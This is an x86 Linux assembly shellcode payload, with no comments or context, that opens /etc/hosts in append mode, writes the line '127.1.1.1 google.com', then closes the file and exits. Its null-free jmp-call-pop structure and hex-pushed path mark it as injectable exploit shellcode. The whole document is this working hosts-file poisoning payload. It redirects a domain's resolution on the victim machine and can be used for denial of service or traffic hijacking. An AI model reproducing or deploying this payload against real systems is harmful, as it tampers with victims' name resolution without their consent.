global _start
section .text

_start:
    xor ecx, ecx
    mul ecx
    mov al, 0x5     
    push ecx
    push 0x7374736f     
    push 0x682f2f2f
    push 0x6374652f
    mov ebx, esp
    mov cx, 0x401       
    int 0x80        

    xchg eax, ebx
    push 0x4
    pop eax
    jmp short _load_data

_write:
    pop ecx
    push 21
    pop edx
    int 0x80        

    push 0x6
    pop eax
    int 0x80

    push 0x1
    pop eax
    int 0x80        

_load_data:
    call _write
    google db 0x0A, "127.1.1.1 google.com"
